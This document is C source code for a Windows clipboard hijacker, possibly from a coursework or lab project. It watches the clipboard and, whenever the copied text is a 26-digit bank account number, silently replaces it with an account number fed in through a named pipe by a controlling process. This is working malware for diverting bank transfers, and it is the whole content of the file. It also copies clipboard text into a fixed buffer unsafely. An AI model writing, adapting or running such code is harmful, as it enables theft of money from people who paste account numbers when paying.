#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>


#pragma comment(lib, "WSOCK32.lib")
HANDLE pipe;
HWND mainFrame2;
char numberAccount[] = "00000000000000000000000000";
HANDLE ghMutex;


boolean checkIfItsNumber(char* buffer) {
	int lengthOfBuffer = strlen(buffer);
	int lengthOfAccountNumber = 26;
	for (int i = 0; i < lengthOfBuffer; i++) {
		if (buffer[i] >= '0' && buffer[i] <= '9') {
			lengthOfAccountNumber -= 1;
		}
		else {
			return false;
		}
	}
	if (lengthOfAccountNumber == 0) {
		return true;
	}
	else {
		return false;
	}
}
LRESULT CALLBACK WindowProc2(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	static HWND hwndNxtVwr;
	
	switch (message)
	{
	case WM_CREATE:
		hwndNxtVwr = SetClipboardViewer(hwnd);
		return (0);
	
	case WM_CHANGECBCHAIN: 
		if (wParam == (WORD)hwndNxtVwr)
		{
			hwndNxtVwr = (HWND)LOWORD(lParam); 
		}
		else
		{
			if (hwndNxtVwr != NULL){
				SendMessage(hwndNxtVwr, message, wParam, lParam);
			}
		}
		return (0);
	case WM_DRAWCLIPBOARD: {

		if (IsClipboardFormatAvailable(CF_TEXT)) {
			OpenClipboard(hwnd);
			HANDLE hCbMem = GetClipboardData(CF_TEXT);
			HANDLE hProgMem = GlobalAlloc(GHND, GlobalSize(hCbMem));
			if (hProgMem != NULL) {

				LPSTR lpCbMem = (LPSTR)GlobalLock(hCbMem);
				LPSTR lpProgMem = (LPSTR)GlobalLock(hProgMem);
				strcpy(lpProgMem, lpCbMem);

				GlobalUnlock(hCbMem);
				GlobalUnlock(hProgMem);
				CloseClipboard();

				char buf[512];

				strcpy(buf, lpProgMem);

				if (checkIfItsNumber(buf)) {

					unsigned int wLen = strlen(buf);
					HGLOBAL hCbMem2 = GlobalAlloc(GHND, (DWORD)wLen + 1);
					LPVOID lpCbMem2 = GlobalLock(hCbMem2);
					char* cpCbMem = (char*)lpCbMem;
					char* cpProgMem = (char*)lpProgMem;

					WaitForSingleObject(ghMutex, INFINITE);
					memcpy(lpCbMem2, numberAccount, wLen + 1);
					ReleaseMutex(ghMutex);
					

					GlobalUnlock(hCbMem2);

					OpenClipboard(hwnd);
					EmptyClipboard();
					SetClipboardData(CF_TEXT, hCbMem2);
					CloseClipboard();

				}

			}
		}
		if (hwndNxtVwr != NULL)
		{
			SendMessage(hwndNxtVwr, message, wParam, lParam);
		}
		return (0);
	}
	case WM_DESTROY:
		ChangeClipboardChain(hwnd, hwndNxtVwr);
		PostQuitMessage(0);
		return (0);
	default:
		return DefWindowProc(hwnd, message, wParam, lParam);
	}
}

char newNumberAccount[] = "00000000000000000000000000";
DWORD WINAPI servicing(void* arg) {
	while (true) {
		ReadFile(pipe, newNumberAccount, 27, NULL, NULL);
		if (checkIfItsNumber(newNumberAccount)) {
			WaitForSingleObject(ghMutex, INFINITE);
			memcpy(numberAccount, newNumberAccount, strlen(newNumberAccount));
			ReleaseMutex(ghMutex);
		}
	}
	return 0;

}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow)
{

	const wchar_t CLASS_NAME[] = L"MyClientClipboardtClass";

	WNDCLASS wc = {};
	wc.lpfnWndProc = WindowProc2;
	wc.hInstance = hInstance;
	wc.lpszClassName = CLASS_NAME;
	wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
	RegisterClass(&wc);

	mainFrame2 = CreateWindowEx(0, CLASS_NAME, L"Client_clipboard", WS_OVERLAPPEDWINDOW | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 250, 250, NULL, NULL, hInstance, NULL);
	pipe = CreateFileA("\\\\.\\pipe\\xd", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL, NULL);
	if (pipe == INVALID_HANDLE_VALUE) {
		MessageBoxA(mainFrame2, "Could not make pipe - clipboard.", "Could not make pipe.", 0);
		return -1;
	}
	ghMutex = CreateMutex(
		NULL,              // default security attributes
		FALSE,             // initially not owned
		NULL);             // unnamed mutex

	if (ghMutex == NULL)
	{
		MessageBoxA(mainFrame2, "CreateMutex error.", "CreateMutex error.", 0);
		return 1;
	}
	DWORD id;
	HANDLE thread = CreateThread(NULL, 0, servicing, NULL, 0, &id);
	if (thread != INVALID_HANDLE_VALUE)
	{
		SetThreadPriority(thread, THREAD_PRIORITY_NORMAL);
	}
	
	MSG msg;
	while (GetMessage(&msg, (HWND)NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	CloseHandle(pipe);
	CloseHandle(ghMutex);
	return msg.wParam;
	
}